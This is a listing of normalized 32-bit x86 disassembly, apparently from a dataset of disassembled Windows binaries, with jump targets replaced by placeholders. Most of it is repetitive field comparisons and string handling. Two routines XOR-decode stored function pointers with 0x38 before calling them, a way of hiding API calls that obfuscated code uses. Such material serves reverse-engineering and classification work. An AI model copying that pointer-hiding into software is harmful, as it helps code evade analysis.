movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
sub_100571a0
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x14 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x77
cmp eax 0x3
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov eax [ ecx + 0x28 ]
mov [ esi ] eax
mov eax [ ecx + 0x2c ]
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x76
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
xor ecx ebp
mov eax esi
call sub_10024145
mov esp ebp
pop ebp
retn
call sub_100050e0
push 0x4
push 0x0
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
sub_1005721e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
cmp eax ecx
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_10050437
test edi edi
je r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x8
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
sub eax edi
add eax eax
push eax
lea eax [ ecx + edi ]
lea eax [ ebx + eax * 2 ]
push eax
lea eax [ edx + ecx * 2 ]
push eax
call sub_10078db0
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
xor edx edx
mov [ ecx + eax * 2 ] dx
sub_100572a9
push 0x38
mov eax sub_1007f89a
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_100688a0
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1002b6c2
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10069ce0
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10058a63
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_10057380
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push ebx
push esi
xor eax eax
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp + 0x14 ]
mov bl 0x38
push eax
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp + 0xc ] edx
mov edx [ ebp + 0x8 ]
xor [ ebp + 0xc ] bl
xor [ ebp + 0xd ] bl
xor [ ebp + 0xe ] bl
xor [ ebp + 0xf ] bl
push eax
lea ecx [ ebp - 0x1c ]
push ecx
push edx
push eax
push eax
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
call [ ebp + 0xc ]
mov esi eax
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov edx [ rw-data ]
mov eax [ ebp - 0x18 ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push eax
call [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_10057446
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_10043285
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1001d665
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1003fe0d
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x20
sub_10057510
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ rw-data ]
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov al 0x38
xor [ ebp + 0x8 ] al
xor [ ebp + 0x9 ] al
xor [ ebp + 0xa ] al
xor [ ebp + 0xb ] al
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] 0x4
call [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_10057560
push ebp
mov ebp esp
push 0xffffffff
push sub_10080be7
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push 0xffffffff
lea ecx [ esi + 0x4 ]
xor edi edi
mov [ esi ] r--data
push edi
mov ebx 0x7
xor eax eax
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push edx
mov [ ecx ] ax
call sub_10019180
mov ax [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
mov [ esi + 0x20 ] ax
mov eax [ ebp + 0x10 ]
push 0xffffffff
lea ecx [ esi + 0x24 ]
push edi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push eax
mov [ ecx ] dx
call sub_10019180
mov eax [ ebp + 0x14 ]
push 0xffffffff
lea ecx [ esi + 0x40 ]
mov [ ebp - 0x4 ] 0x1
push edi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push eax
mov [ ecx ] dx
call sub_10019180
mov eax [ ebp + 0x18 ]
push 0xffffffff
lea ecx [ esi + 0x5c ]
mov [ ebp - 0x4 ] 0x2
push edi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push eax
mov [ ecx ] dx
call sub_10019180
mov eax [ ebp + 0x1c ]
push 0xffffffff
lea ecx [ esi + 0x78 ]
mov [ ebp - 0x4 ] 0x3
push edi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push eax
mov [ ecx ] dx
call sub_10019180
mov eax [ ebp + 0x20 ]
push 0xffffffff
lea ecx [ esi + 0x94 ]
mov [ ebp - 0x4 ] 0x4
push edi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push eax
mov [ ecx ] dx
call sub_10019180
mov ecx [ ebp + 0x24 ]
mov edx [ ebp + 0x28 ]
mov [ esi + 0xb0 ] ecx
mov [ esi + 0xb4 ] edx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_10057683
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x7f3
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_10062235
mov ecx [ ebp + 0x20 ]
or [ ecx ] eax
mov eax [ ecx ]
add esp 0x18
test al 0x2
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x20
push esi
mov esi [ ebp - 0x4 ]
mov edx 0x76c
cmp esi edx
jl r-xdata
cmp esi 0x87
jle r-xdata
sub esi edx
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ eax + 0x14 ] esi
pop esi
or eax 0x2
mov [ ecx ] eax
sub_100576f0
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10042f30
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi [ rw-data ]
xor edi edi
xor eax eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x60 ]
push eax
mov ecx esi
call sub_100211b0
cmp eax edi
jne r-xdata
lea ecx [ ebp - 0x3c ]
call sub_10022fe0
test eax eax
jne r-xdata
lea ebx [ esi + 0xd7c ]
push ebx
lea ecx [ ebp - 0x60 ]
push ecx
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
call sub_1002ca50
cmp eax [ esi + 0xd58 ]
je r-xdata
